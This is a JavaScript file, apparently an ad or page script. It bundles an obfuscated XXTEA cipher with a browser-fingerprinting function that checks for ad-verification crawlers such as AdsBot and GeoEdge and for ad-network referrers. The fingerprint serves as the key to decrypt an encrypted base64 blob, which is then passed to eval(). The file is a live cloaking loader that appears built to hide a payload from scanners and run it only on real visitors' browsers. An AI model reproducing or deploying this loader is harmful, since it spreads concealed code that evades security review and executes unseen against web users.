"use strict";
var T = {};
(T.e0 = function(b, a) {
  var key;
  var val;
  var s;
  return (
    (b = String(b)),
    (a = String(a)),
    0 == b.length
      ? ""
      : ((key = T.f0(b.u0())),
        (val = T.f0(a.u0().slice(0, 16))),
        key.length,
        (key = T.e1(key, val)),
        (s = T.longsToStr(key)),
        s.b0())
  );
}),
  (T.d0 = function(m, prefix) {
    var n;
    var t;
    return (
      (m = String(m)),
      (prefix = String(prefix)),
      0 == m.length
        ? ""
        : ((n = T.f0(m.b1())),
          (t = T.f0(prefix.u0().slice(0, 16))),
          n.length,
          (n = T.d1(n, t)),
          (m = T.longsToStr(n)),
          (m = m.replace(/\0+$/, "")),
          m.u1())
    );
  }),
  (T.e1 = function(data, k) {
    var l;
    var z;
    var y;
    var curDigit;
    var a;
    var e;
    var k;
    var sum;
    var i;
    if (data.length < 2) {
      /** @type {number} */
      data[1] = 0;
    }
    l = data.length;
    z = data[l - 1];
    y = data[0];
    /** @type {number} */
    curDigit = 2654435769;
    /** @type {number} */
    k = Math.floor(6 + 52 / l);
    /** @type {number} */
    sum = 0;
    for (; k-- > 0; ) {
      /** @type {number} */
      sum = sum + curDigit;
      /** @type {number} */
      e = 3 & (sum >>> 2);
      /** @type {number} */
      i = 0;
      for (; l > i; i++) {
        y = data[(i + 1) % l];
        /** @type {number} */
        a =
          (((z >>> 5) ^ (y << 2)) + ((y >>> 3) ^ (z << 4))) ^
          ((sum ^ y) + (k[(3 & i) ^ e] ^ z));
        z = data[i] += a;
      }
    }
    return data;
  }),
  (T.d1 = function(v, k) {
    var mx;
    var e;
    var p;
    var n = v.length;
    var z = v[n - 1];
    var y = v[0];
    /** @type {number} */
    var CommentMatchPenalty = 2654435769;
    /** @type {number} */
    var hexRadius = Math.floor(6 + 52 / n);
    /** @type {number} */
    var regExBonusMultiplier = hexRadius * CommentMatchPenalty;
    for (; 0 != regExBonusMultiplier; ) {
      /** @type {number} */
      e = 3 & (regExBonusMultiplier >>> 2);
      /** @type {number} */
      p = n - 1;
      for (; p >= 0; p--) {
        z = v[p > 0 ? p - 1 : n - 1];
        /** @type {number} */
        mx =
          (((z >>> 5) ^ (y << 2)) + ((y >>> 3) ^ (z << 4))) ^
          ((regExBonusMultiplier ^ y) + (k[(3 & p) ^ e] ^ z));
        /** @type {number} */
        y = v[p] -= mx;
      }
      /** @type {number} */
      regExBonusMultiplier = regExBonusMultiplier - CommentMatchPenalty;
    }
    return v;
  }),
  (T.f0 = function(p) {
    var i;
    /** @type {!Array} */
    var ret = new Array(Math.ceil(p.length / 4));
    /** @type {number} */
    i = 0;
    for (; i < ret.length; i++) {
      ret[i] =
        p.charCodeAt(4 * i) +
        (p.charCodeAt(4 * i + 1) << 8) +
        (p.charCodeAt(4 * i + 2) << 16) +
        (p.charCodeAt(4 * i + 3) << 24);
    }
    return ret;
  }),
  (T.longsToStr = function(tree) {
    var i;
    /** @type {!Array} */
    var c = new Array(tree.length);
    /** @type {number} */
    i = 0;
    for (; i < tree.length; i++) {
      /** @type {string} */
      c[i] = String.fromCharCode(
        255 & tree[i],
        255 & (tree[i] >>> 8),
        255 & (tree[i] >>> 16),
        255 & (tree[i] >>> 24)
      );
    }
    return c.join("");
  }),
  "undefined" == typeof String.prototype.u0 &&
    (String.prototype.u0 = function() {
      return unescape(encodeURIComponent(this));
    }),
  "undefined" == typeof String.prototype.u1 &&
    (String.prototype.u1 = function() {
      try {
        return decodeURIComponent(escape(this));
      } catch (a) {
        return this;
      }
    }),
  "undefined" == typeof String.prototype.b0 &&
    (String.prototype.b0 = function() {
      if ("undefined" != typeof btoa) {
        return btoa(this);
      }
      if ("undefined" != typeof Buffer) {
        return new Buffer(this, "utf8").toString("base64");
      }
      throw new Error("err");
    }),
  "undefined" == typeof String.prototype.b1 &&
    (String.prototype.b1 = function() {
      if ("undefined" != typeof atob) {
        return atob(this);
      }
      if ("undefined" != typeof Buffer) {
        return new Buffer(this, "base64").toString("utf8");
      }
      throw new Error("err");
    }),
  "undefined" != typeof module && module.exports && (module.exports = T),
  "function" == typeof define &&
    define.amd &&
    define([""], function() {
      return T;
    });
/**
 * @return {?}
 */
function dJw() {
  try {
    return (
      navigator.platform.toUpperCase().substr(0, 5) +
      Number(/android/i.test(navigator.userAgent)) +
      Number(/AdsBot/i.test(navigator.userAgent)) +
      Number(/Google/i.test(navigator.userAgent)) +
      Number(/geoedge/i.test(navigator.userAgent)) +
      Number(/tmt/i.test(navigator.userAgent)) +
      navigator.language.toUpperCase().substr(0, 2) +
      Number(
        /tpc.googlesyndication.com/i.test(document.referrer) ||
          /doubleclick.net/i.test(document.referrer)
      ) +
      Number(/geoedge/i.test(document.referrer)) +
      Number(/tmt/i.test(document.referrer)) +
      performance.navigation.type +
      performance.navigation.redirectCount +
      Number(navigator.cookieEnabled) +
      Number(navigator.onLine) +
      navigator.appCodeName.toUpperCase().substr(0, 7) +
      Number(navigator.maxTouchPoints > 0) +
      Number(
        undefined == window.chrome ? true : undefined == window.chrome.app
      ) +
      navigator.plugins.length
    );
  } catch (e) {
    return "err";
  }
}
/** @type {string} */
a = "A2xcVTrDuF+EqdD8VibVZIWY2k334hwWPsIzgPgmHSapj+zeDlPqH/RHlpVCitdlxQQfzOjO01xCW/6TNqkciPRbOZsizdYNf5eEOgghG0YhmIplCBLhGdxmnvsIT/69I08I/ZvIxkWyufhLayTDzFeGZlPQfjqtY8Wr59Lkw/JggztpJYPWng==";
eval(T.d0(a, dJw()));
